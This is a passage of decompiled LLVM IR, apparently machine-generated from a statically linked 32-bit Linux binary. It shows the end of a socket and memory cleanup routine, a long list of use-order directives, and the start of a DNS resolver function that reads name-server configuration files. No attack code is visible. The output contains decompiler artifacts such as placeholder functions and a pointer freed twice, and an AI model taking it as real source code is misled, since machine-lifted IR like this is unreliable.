  store i32 %v3_80662ea, i32* %v6_80662ea, align 4
  %v1_80662ee = sext i16 %stack_var_-180.1 to i32
  %v2_80662ee = call i32 @__libc_close(i32 %v1_80662ee)
  store i32 %v2_80662ee, i32* %eax.global-to-local, align 4
  %v0_80662f3 = load i32, i32* @esp, align 4
  %v1_80662f3 = add i32 %v0_80662f3, 16
  br label %dec_label_pc_80662f6

dec_label_pc_80662f6:                             ; preds = %dec_label_pc_80662e0.dec_label_pc_80662f6_crit_edge, %dec_label_pc_80662e7
  %v1_80662fd.pre-phi = phi i32 [ %.pre, %dec_label_pc_80662e0.dec_label_pc_80662f6_crit_edge ], [ %v1_80662ee, %dec_label_pc_80662e7 ]
  %v0_80662f6 = phi i32 [ %v0_80662e0, %dec_label_pc_80662e0.dec_label_pc_80662f6_crit_edge ], [ %v1_80662f3, %dec_label_pc_80662e7 ]
  %v1_80662f9 = add i32 %v0_80662f6, 12
  %v2_80662f9 = inttoptr i32 %v1_80662f9 to i32*
  %v3_80662f9 = load i32, i32* %v2_80662f9, align 4
  %v5_80662f9 = add i32 %v0_80662f6, -16
  %v6_80662f9 = inttoptr i32 %v5_80662f9 to i32*
  store i32 %v3_80662f9, i32* %v6_80662f9, align 4
  %v2_80662fd = call i32 @free(i32 %v1_80662fd.pre-phi)
  store i32 %v2_80662fd, i32* %eax.global-to-local, align 4
  %v1_8066302 = load i32, i32* @esp, align 4
  %v2_8066302 = inttoptr i32 %v1_8066302 to i32*
  store i32 %v2_8065c3a, i32* %v2_8066302, align 4
  %v2_8066305 = call i32 @free(i32 %v1_80662fd.pre-phi)
  store i32 %v2_8066305, i32* %eax.global-to-local, align 4
  %v0_806630a = load i32, i32* @esp, align 4
  %v1_806630d = add i32 %v0_806630a, 56
  %v2_806630d = inttoptr i32 %v1_806630d to i32*
  %v3_806630d = load i32, i32* %v2_806630d, align 4
  %v13_806630d = icmp eq i32 %v3_806630d, -1
  %v1_8066312 = add i32 %v0_806630a, 32
  %v2_8066312 = inttoptr i32 %v1_8066312 to i32*
  store i32 -1, i32* %v2_8066312, align 4
  br i1 %v13_806630d, label %dec_label_pc_80662f6.dec_label_pc_8066369_crit_edge, label %dec_label_pc_806631c

dec_label_pc_80662f6.dec_label_pc_8066369_crit_edge: ; preds = %dec_label_pc_80662f6
  %v0_8066369.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8066369

dec_label_pc_806631c:                             ; preds = %dec_label_pc_80662f6
  %v0_806631c = load i32, i32* @ecx, align 4
  %v1_806631c = load i32, i32* @esp, align 4
  %v2_806631c = add i32 %v1_806631c, -4
  %v3_806631c = inttoptr i32 %v2_806631c to i32*
  store i32 %v0_806631c, i32* %v3_806631c, align 4
  %v1_806631d = add i32 %v1_806631c, -8
  %v2_806631d = inttoptr i32 %v1_806631d to i32*
  store i32 ptrtoint (i8** @global_var_807da1c.842 to i32), i32* %v2_806631d, align 4
  %v1_8066322 = add i32 %v1_806631c, -12
  %v2_8066322 = inttoptr i32 %v1_8066322 to i32*
  store i32 134586897, i32* %v2_8066322, align 4
  %v1_8066327 = add i32 %v1_806631c, 184
  store i32 %v1_8066327, i32* @ebx, align 4
  %v2_806632e = add i32 %v1_806631c, -16
  %v3_806632e = inttoptr i32 %v2_806632e to i32*
  store i32 %v1_8066327, i32* %v3_806632e, align 4
  %v4_806632f = inttoptr i32 %v1_80662fd.pre-phi to i32*
  %v5_806632f = call i32 @__pthread_cleanup_push_defer(i32* %v4_806632f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_806632f, i32* %eax.global-to-local, align 4
  %v0_8066334 = load i32, i32* @esp, align 4
  %v1_8066334 = inttoptr i32 %v0_8066334 to i32*
  store i32 ptrtoint (i8** @global_var_807da1c.842 to i32), i32* %v1_8066334, align 4
  %v2_806633b = call i32 @pthread_mutex_lock(i32 %v1_80662fd.pre-phi)
  store i32 %v2_806633b, i32* %eax.global-to-local, align 4
  %v0_8066340 = load i32, i32* @esp, align 4
  %v1_8066340 = add i32 %v0_8066340, 60
  %v2_8066340 = inttoptr i32 %v1_8066340 to i32*
  %v3_8066340 = load i32, i32* %v2_8066340, align 4
  store i32 %v3_8066340, i32* %eax.global-to-local, align 4
  %v1_8066344 = add i32 %v0_8066340, 56
  %v2_8066344 = inttoptr i32 %v1_8066344 to i32*
  %v3_8066344 = load i32, i32* %v2_8066344, align 4
  store i32 %v3_8066344, i32* %edx.global-to-local, align 4
  %v1_8066348 = trunc i32 %v3_8066340 to i16
  store i16 %v1_8066348, i16* @global_var_8075008.844, align 8
  %v1_806634e = inttoptr i32 %v0_8066340 to i32*
  %v2_806634e = load i32, i32* %v1_806634e, align 4
  store i32 %v2_806634e, i32* %eax.global-to-local, align 4
  %v3_806634e = add i32 %v0_8066340, 4
  %v1_806634f = sext i32 %v3_8066344 to i64
  store i64 %v1_806634f, i64* @global_var_807da34.843, align 8
  %v1_8066355 = inttoptr i32 %v3_806634e to i32*
  %v2_8066355 = load i32, i32* %v1_8066355, align 4
  store i32 %v2_8066355, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8066355, align 4
  %v0_8066358 = load i32, i32* @ebx, align 4
  store i32 %v0_8066358, i32* %v1_806634e, align 4
  %v4_8066359 = call i32 @__pthread_cleanup_pop_restore(i32* %v4_806632f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8066359, i32* %eax.global-to-local, align 4
  %v0_806635e = load i32, i32* @esp, align 4
  %v1_806635e = add i32 %v0_806635e, 32
  %v2_806635e = inttoptr i32 %v1_806635e to i32*
  store i32 -1, i32* %v2_806635e, align 4
  br label %dec_label_pc_8066366

dec_label_pc_8066366:                             ; preds = %dec_label_pc_80661da, %dec_label_pc_806631c
  %v0_8066366 = load i32, i32* @esp, align 4
  %v1_8066366 = add i32 %v0_8066366, 16
  br label %dec_label_pc_8066369

dec_label_pc_8066369:                             ; preds = %dec_label_pc_80662f6.dec_label_pc_8066369_crit_edge, %dec_label_pc_8066366
  %v0_8066369 = phi i32 [ %v0_8066369.pre, %dec_label_pc_80662f6.dec_label_pc_8066369_crit_edge ], [ %v1_8066366, %dec_label_pc_8066366 ]
  %v1_8066369 = add i32 %v0_8066369, 16
  %v2_8066369 = inttoptr i32 %v1_8066369 to i32*
  %v3_8066369 = load i32, i32* %v2_8066369, align 4
  store i32 %v3_8066369, i32* %eax.global-to-local, align 4
  %v1_806636d = add i32 %v0_8066369, 220
  %v1_8066373 = inttoptr i32 %v1_806636d to i32*
  %v2_8066373 = load i32, i32* %v1_8066373, align 4
  store i32 %v2_8066373, i32* @ebx, align 4
  %v3_8066373 = add i32 %v0_8066369, 224
  %v1_8066374 = inttoptr i32 %v3_8066373 to i32*
  %v2_8066374 = load i32, i32* %v1_8066374, align 4
  store i32 %v2_8066374, i32* @esi, align 4
  %v3_8066374 = add i32 %v0_8066369, 228
  %v1_8066375 = inttoptr i32 %v3_8066374 to i32*
  %v2_8066375 = load i32, i32* %v1_8066375, align 4
  store i32 %v2_8066375, i32* @edi, align 4
  %v3_8066375 = add i32 %v0_8066369, 232
  %v1_8066376 = inttoptr i32 %v3_8066375 to i32*
  %v2_8066376 = load i32, i32* %v1_8066376, align 4
  store i32 %v2_8066376, i32* @ebp, align 4
  ret i32 %v3_8066369

; uselistorder directives
  uselistorder i32 %v0_8066369, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8066340, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80662f6, { 1, 0 }
  uselistorder i32 %v1_80662fd.pre-phi, { 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_80662a8.pre, { 1, 0 }
  uselistorder i32 %v5_806627b, { 1, 0 }
  uselistorder i32 %v3_806627b, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8066243, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_806620c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80661da, { 1, 0 }
  uselistorder i32 %v3_80661b9, { 1, 0, 2 }
  uselistorder i32 %v0_80661aa, { 1, 0 }
  uselistorder i32 %v5_80661a0, { 1, 0 }
  uselistorder i32* %v3_80661a0, { 1, 0 }
  uselistorder i32 %v0_806607679, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_80661a0, { 2, 1, 0 }
  uselistorder i32 %v5_806619a, { 1, 0 }
  uselistorder i32 %v1_8066199, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8066195, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8066159, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8066133, { 1, 0 }
  uselistorder i32 %v1_8066124, { 1, 0 }
  uselistorder i32 %v3_80660f5, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80660e3, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_806608a, { 1, 2, 0 }
  uselistorder i32 %v0_806608a, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8066064, { 1, 0 }
  uselistorder i32 %v0_8066064.pre, { 2, 1, 0 }
  uselistorder i32 %v0_806605a, { 1, 2, 0 }
  uselistorder i32 %v0_806606c67, { 3, 2, 1, 0 }
  uselistorder i32 %v5_806606458, { 1, 0 }
  uselistorder i32 %v5_8066006, { 1, 0 }
  uselistorder i32* %v2_8066006, { 1, 0, 2 }
  uselistorder i32 %v3_8065fbe, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8065fa4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8065fa4, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8065f83, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8065f63, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8065f09, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8065eee, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8065ed7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8065e5f, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8065e12, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8065df3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8065dd7, { 1, 0 }
  uselistorder i32 %v3_8065dcc, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8065dc9, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8065d6e, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8065d69, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8065d52, { 1, 0 }
  uselistorder i32 %v1_8065d1e, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8065d0f93, { 2, 1, 0 }
  uselistorder i16 %v0_8065ccf, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_8065cc8, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 13 }
  uselistorder i32 %v2_8065c3a, { 3, 1, 7, 2, 4, 5, 8, 9, 0, 6, 10, 11, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 97, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 51, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 84, 80, 81, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 148, { 0, 2, 1 }
  uselistorder i32 160, { 0, 2, 1, 3 }
  uselistorder i32 100, { 0, 4, 2, 3, 1 }
  uselistorder i32 68, { 2, 1, 4, 5, 0, 3, 6 }
  uselistorder i8 1, { 15, 1, 16, 5, 0, 21, 17, 18, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 88, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0 }
  uselistorder i32 17, { 9, 2, 0, 8, 6, 7, 3, 4, 1, 11, 5, 10 }
  uselistorder i32 176, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @inet_addr, { 0, 3, 2, 1 }
  uselistorder i32 220, { 2, 3, 1, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1, 5, 3, 4 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32* inttoptr (i32 -1 to i32*), { 4, 5, 0, 1, 2, 3, 6, 7 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 72, { 0, 3, 4, 2, 1, 5 }
  uselistorder i32 84, { 3, 0, 4, 1, 5, 6, 2 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 17, 18, 19, 2, 3, 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 20, 21, 22, 23, 26, 25, 24, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 28, 29, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32 -12, { 13, 7, 6, 8, 1, 9, 10, 11, 12, 0, 2, 14, 27, 25, 26, 3, 19, 15, 4, 16, 17, 18, 20, 21, 5, 23, 22, 24, 28 }
  uselistorder i32 -8, { 10, 4, 3, 5, 0, 6, 7, 8, 9, 1, 11, 25, 23, 24, 22, 2, 17, 12, 13, 14, 15, 16, 18, 19, 20, 21 }
  uselistorder i32 -4, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 37, 38, 18, 19, 6, 39, 20, 21, 22, 51, 53, 54, 55, 7, 52, 2, 50, 0, 1, 4, 5, 42, 43, 44, 45, 46, 47, 48, 8, 36, 40, 41, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 49, 35, 3 }
  uselistorder i32 -16, { 18, 19, 20, 9, 11, 12, 8, 10, 2, 13, 7, 14, 15, 16, 17, 3, 21, 31, 32, 0, 4, 26, 22, 5, 23, 24, 25, 27, 28, 6, 29, 30, 1 }
  uselistorder i16* @global_var_8075008.844, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0 }
  uselistorder i64* @global_var_807da34.843, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_807da1c.842 to i32), { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @malloc, { 10, 9, 5, 4, 3, 1, 2, 0, 8, 7, 11, 12, 6 }
  uselistorder i32 512, { 9, 3, 10, 11, 4, 5, 0, 1, 2, 8, 6, 7 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8066369, { 1, 0 }
  uselistorder label %dec_label_pc_8066366, { 1, 0 }
  uselistorder label %dec_label_pc_80662f6, { 1, 0 }
  uselistorder label %dec_label_pc_80662e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80662cd, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_80662a8.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80662a0, { 1, 0 }
  uselistorder label %dec_label_pc_8066287, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_806623c, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80661da, { 1, 0 }
  uselistorder label %dec_label_pc_80661aa, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_80661a0, { 1, 0 }
  uselistorder label %dec_label_pc_8066195, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066192, { 1, 0 }
  uselistorder label %dec_label_pc_806610d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8066055, { 1, 0 }
  uselistorder label %dec_label_pc_8065ed7, { 1, 0 }
  uselistorder label %dec_label_pc_8065ea0, { 1, 0 }
  uselistorder label %dec_label_pc_8065e12, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8065d1e, { 1, 0 }
  uselistorder label %dec_label_pc_8065d08, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8066378 = load i32, i32* @ebp, align 4
  %v0_8066379 = load i32, i32* @edi, align 4
  %v0_806637a = load i32, i32* @esi, align 4
  store i32 134586897, i32* %stack_var_-216, align 4
  %v3_8066387 = ptrtoint i32* %stack_var_-216 to i32
  %v4_8066394 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134586897, i32 ptrtoint (i32* @global_var_807500c.723 to i32))
  %v1_80663a0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807500c.723 to i32))
  store i32 %v1_80663a0, i32* @eax, align 4
  %v0_80663a8 = load i32, i32* @global_var_807f560.724, align 32
  %tmp39 = icmp slt i32 %v0_80663a8, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_806659f, label %dec_label_pc_80663b5

dec_label_pc_80663b5:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_806f591.835 to i32), i32* %stack_var_-216, align 4
  %v2_80663c1 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_806f55f.847 to i32), i32 ptrtoint (i32* @global_var_806f591.835 to i32))
  store i32 %v2_80663c1, i32* @eax, align 4
  %v1_80663c9 = icmp eq i32 %v2_80663c1, 0
  store i32 %v2_80663c1, i32* @ebp, align 4
  %v1_80663cd = icmp eq i1 %v1_80663c9, false
  br i1 %v1_80663cd, label %dec_label_pc_806656a.preheader, label %dec_label_pc_80663d3

dec_label_pc_80663d3:                             ; preds = %dec_label_pc_80663b5
  store i32 ptrtoint (i32* @global_var_806f591.835 to i32), i32* %stack_var_-216, align 4
  %v2_80663df = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_806f570.848 to i32), i32 ptrtoint (i32* @global_var_806f591.835 to i32))
  %v1_80663e7 = icmp eq i32 %v2_80663df, 0
  store i32 %v2_80663df, i32* @ebp, align 4
  %v1_80663eb = icmp eq i1 %v1_80663e7, false
  br i1 %v1_80663eb, label %dec_label_pc_806656a.preheader, label %dec_label_pc_8066594

dec_label_pc_806656a.preheader:                   ; preds = %dec_label_pc_80663b5, %dec_label_pc_80663d3
  %v2_8066571 = ptrtoint i32* %stack_var_-180 to i32
  %v3_80664a5 = add i32 %v3_8066387, 164
  %v2_8066494 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_806656a

dec_label_pc_80663f6:                             ; preds = %dec_label_pc_8066401
  %v1_80663f6 = add i32 %v0_80663f654, 1
  store i32 %v1_80663f6, i32* @ebx, align 4
  %v1_80663f7 = inttoptr i32 %v1_80663f6 to i8*
  %v2_80663f7 = load i8, i8* %v1_80663f7, align 1
  %v3_80663f7 = zext i8 %v2_80663f7 to i32
  %v5_80663f7 = and i32 %v6_80663f757, -256
  %v6_80663f7 = or i32 %v3_80663f7, %v5_80663f7
  store i32 %v6_80663f7, i32* @ecx, align 4
  %v4_80663f9 = icmp eq i8 %v2_80663f7, 0
  br i1 %v4_80663f9, label %dec_label_pc_806656a, label %dec_label_pc_8066401

dec_label_pc_8066401:                             ; preds = %dec_label_pc_8066401.lr.ph, %dec_label_pc_80663f6
  %v6_80663f757 = phi i32 [ %v6_80663f751, %dec_label_pc_8066401.lr.ph ], [ %v6_80663f7, %dec_label_pc_80663f6 ]
  %v2_80663f756 = phi i8 [ %v2_80663f748, %dec_label_pc_8066401.lr.ph ], [ %v2_80663f7, %dec_label_pc_80663f6 ]
  %v1_80663f755 = phi i8* [ %v1_80663f747, %dec_label_pc_8066401.lr.ph ], [ %v1_80663f7, %dec_label_pc_80663f6 ]
  %v0_80663f654 = phi i32 [ %v0_80663f7.pre, %dec_label_pc_8066401.lr.ph ], [ %v1_80663f6, %dec_label_pc_80663f6 ]
  store i32 %v0_8066401.pre, i32* @eax, align 4
  %v2_8066406 = sext i8 %v2_80663f756 to i32
  store i32 %v2_8066406, i32* @edx, align 4
  %v2_8066409 = mul nsw i32 %v2_8066406, 2
  %v3_8066409 = add i32 %v0_8066401.pre, %v2_8066409
  %v4_8066409 = inttoptr i32 %v3_8066409 to i8*
  %v5_8066409 = load i8, i8* %v4_8066409, align 1
  %v6_8066409 = and i8 %v5_8066409, 32
  %v7_8066409 = icmp eq i8 %v6_8066409, 0
  %v1_806640d = icmp eq i1 %v7_8066409, false
  br i1 %v1_806640d, label %dec_label_pc_80663f6, label %dec_label_pc_806640f

dec_label_pc_806640f:                             ; preds = %dec_label_pc_8066401
  %v10_806640f = icmp eq i8 %v2_80663f756, 10
  br i1 %v10_806640f, label %dec_label_pc_806656a, label %dec_label_pc_8066418

dec_label_pc_8066418:                             ; preds = %dec_label_pc_806640f
  %v10_8066418 = icmp eq i8 %v2_80663f756, 35
  %v1_8066423 = icmp eq i1 %v10_8066418, false
  br i1 %v1_8066423, label %dec_label_pc_8066474.preheader, label %dec_label_pc_806656a

dec_label_pc_8066474.preheader:                   ; preds = %dec_label_pc_8066418
  %v2_80664744 = load i8, i8* %v1_80663f755, align 1
  %v3_80664745 = icmp eq i8 %v2_80664744, 0
  br i1 %v3_80664745, label %dec_label_pc_8066480, label %dec_label_pc_8066479

dec_label_pc_806642a:                             ; preds = %dec_label_pc_8066479
  store i32 %stack_var_-196.011, i32* @eax, align 4
  %v1_806642e = load i32, i32* @esp, align 4
  %v3_806642e = mul nuw nsw i32 %stack_var_-196.011, 4
  %v4_806642e = add nuw nsw i32 %v3_806642e, 152
  %v5_806642e = add i32 %v4_806642e, %v1_806642e
  %v6_806642e = inttoptr i32 %v5_806642e to i32*
  store i32 %v0_806642e, i32* %v6_806642e, align 4
  %v0_8066438.pre = load i32, i32* @ebx, align 4
  %v4_8066438.pre = load i32, i32* @ecx, align 4
  %v1_806643858 = inttoptr i32 %v0_8066438.pre to i8*
  %v2_806643859 = load i8, i8* %v1_806643858, align 1
  %v3_806643860 = zext i8 %v2_806643859 to i32
  %v5_806643861 = and i32 %v4_8066438.pre, -256
  %v6_806643862 = or i32 %v3_806643860, %v5_806643861
  %v4_806643a63 = icmp eq i8 %v2_806643859, 0
  br i1 %v4_806643a63, label %dec_label_pc_8066457.preheader, label %dec_label_pc_806643e.lr.ph

dec_label_pc_806643e.lr.ph:                       ; preds = %dec_label_pc_806642a
  %v0_806643e.pre = load i32, i32* @global_var_8074fcc, align 4
  br label %dec_label_pc_806643e

dec_label_pc_8066437:                             ; preds = %dec_label_pc_806644c
  %v1_8066437 = add i32 %v0_806643765, 1
  store i32 %v1_8066437, i32* @ebx, align 4
  %v1_8066438 = inttoptr i32 %v1_8066437 to i8*
  %v2_8066438 = load i8, i8* %v1_8066438, align 1
  %v3_8066438 = zext i8 %v2_8066438 to i32
  %v5_8066438 = and i32 %v6_806643867, -256
  %v6_8066438 = or i32 %v3_8066438, %v5_8066438
  %v4_806643a = icmp eq i8 %v2_8066438, 0
  br i1 %v4_806643a, label %dec_label_pc_8066457.preheader, label %dec_label_pc_806643e

dec_label_pc_806643e:                             ; preds = %dec_label_pc_806643e.lr.ph, %dec_label_pc_8066437
  %v6_806643867 = phi i32 [ %v6_806643862, %dec_label_pc_806643e.lr.ph ], [ %v6_8066438, %dec_label_pc_8066437 ]
  %v2_806643866 = phi i8 [ %v2_806643859, %dec_label_pc_806643e.lr.ph ], [ %v2_8066438, %dec_label_pc_8066437 ]
  %v0_806643765 = phi i32 [ %v0_8066438.pre, %dec_label_pc_806643e.lr.ph ], [ %v1_8066437, %dec_label_pc_8066437 ]
  store i32 %v0_806643e.pre, i32* @eax, align 4
  %v2_8066443 = sext i8 %v2_806643866 to i32
  store i32 %v2_8066443, i32* @edx, align 4
  %v2_8066446 = mul nsw i32 %v2_8066443, 2
  %v3_8066446 = add i32 %v0_806643e.pre, %v2_8066446
  %v4_8066446 = inttoptr i32 %v3_8066446 to i8*
  %v5_8066446 = load i8, i8* %v4_8066446, align 1
  %v6_8066446 = and i8 %v5_8066446, 32
  %v7_8066446 = icmp eq i8 %v6_8066446, 0
  %v1_806644a = icmp eq i1 %v7_8066446, false
  br i1 %v1_806644a, label %dec_label_pc_8066457.preheader, label %dec_label_pc_806644c

dec_label_pc_806644c:                             ; preds = %dec_label_pc_806643e
  %v10_806644c = icmp eq i8 %v2_806643866, 10
  %v1_806644f = icmp eq i1 %v10_806644c, false
  br i1 %v1_806644f, label %dec_label_pc_8066437, label %dec_label_pc_8066457.preheader

dec_label_pc_8066457.preheader:                   ; preds = %dec_label_pc_806644c, %dec_label_pc_806643e, %dec_label_pc_8066437, %dec_label_pc_806642a
  %v0_8066437.lcssa = phi i32 [ %v0_8066438.pre, %dec_label_pc_806642a ], [ %v1_8066437, %dec_label_pc_8066437 ], [ %v0_806643765, %dec_label_pc_806643e ], [ %v0_806643765, %dec_label_pc_806644c ]
  %v6_8066438.lcssa = phi i32 [ %v6_806643862, %dec_label_pc_806642a ], [ %v6_8066438, %dec_label_pc_8066437 ], [ %v6_806643867, %dec_label_pc_806643e ], [ %v6_806643867, %dec_label_pc_806644c ]
  %v1_806645773 = inttoptr i32 %v0_8066437.lcssa to i8*
  %v2_806645774 = load i8, i8* %v1_806645773, align 1
  %v3_806645775 = zext i8 %v2_806645774 to i32
  %v5_806645776 = and i32 %v6_8066438.lcssa, -256
  %v6_806645777 = or i32 %v3_806645775, %v5_806645776
  store i32 %v6_806645777, i32* @ecx, align 4
  %v4_806645978 = icmp eq i8 %v2_806645774, 0
  br i1 %v4_806645978, label %dec_label_pc_8066470, label %dec_label_pc_806645d

dec_label_pc_8066453:                             ; preds = %dec_label_pc_806646b, %dec_label_pc_806645d
  store i8 0, i8* %v1_806645781, align 1
  %v0_8066456 = load i32, i32* @ebx, align 4
  %v1_8066456 = add i32 %v0_8066456, 1
  store i32 %v1_8066456, i32* @ebx, align 4
  %v4_8066457.pre = load i32, i32* @ecx, align 4
  %v1_8066457 = inttoptr i32 %v1_8066456 to i8*
  %v2_8066457 = load i8, i8* %v1_8066457, align 1
  %v3_8066457 = zext i8 %v2_8066457 to i32
  %v5_8066457 = and i32 %v4_8066457.pre, -256
  %v6_8066457 = or i32 %v3_8066457, %v5_8066457
  store i32 %v6_8066457, i32* @ecx, align 4
  %v4_8066459 = icmp eq i8 %v2_8066457, 0
  br i1 %v4_8066459, label %dec_label_pc_8066470, label %dec_label_pc_806645d

dec_label_pc_806645d:                             ; preds = %dec_label_pc_8066457.preheader, %dec_label_pc_8066453
  %v2_806645782 = phi i8 [ %v2_8066457, %dec_label_pc_8066453 ], [ %v2_806645774, %dec_label_pc_8066457.preheader ]
  %v1_806645781 = phi i8* [ %v1_8066457, %dec_label_pc_8066453 ], [ %v1_806645773, %dec_label_pc_8066457.preheader ]
  %v0_806647480 = phi i32 [ %v1_8066456, %dec_label_pc_8066453 ], [ %v0_8066437.lcssa, %dec_label_pc_8066457.preheader ]
  %v0_806645d = load i32, i32* @global_var_8074fcc, align 4
  store i32 %v0_806645d, i32* @eax, align 4
  %v2_8066462 = sext i8 %v2_806645782 to i32
  store i32 %v2_8066462, i32* @edx, align 4
  %v2_8066465 = mul nsw i32 %v2_8066462, 2
  %v3_8066465 = add i32 %v0_806645d, %v2_8066465
  %v4_8066465 = inttoptr i32 %v3_8066465 to i8*
  %v5_8066465 = load i8, i8* %v4_8066465, align 1
  %v6_8066465 = and i8 %v5_8066465, 32
  %v7_8066465 = icmp eq i8 %v6_8066465, 0
  %v1_8066469 = icmp eq i1 %v7_8066465, false
  br i1 %v1_8066469, label %dec_label_pc_8066453, label %dec_label_pc_806646b

dec_label_pc_806646b:                             ; preds = %dec_label_pc_806645d
  %v10_806646b = icmp eq i8 %v2_806645782, 10
  br i1 %v10_806646b, label %dec_label_pc_8066453, label %dec_label_pc_8066470

dec_label_pc_8066470:                             ; preds = %dec_label_pc_8066453, %dec_label_pc_806646b, %dec_label_pc_8066457.preheader
  %v0_8066474.lcssa = phi i32 [ %v0_8066437.lcssa, %dec_label_pc_8066457.preheader ], [ %v0_806647480, %dec_label_pc_806646b ], [ %v1_8066456, %dec_label_pc_8066453 ]
  %v1_8066457.lcssa = phi i8* [ %v1_806645773, %dec_label_pc_8066457.preheader ], [ %v1_806645781, %dec_label_pc_806646b ], [ %v1_8066457, %dec_label_pc_8066453 ]
  %v4_8066470 = add nuw nsw i32 %stack_var_-196.011, 1
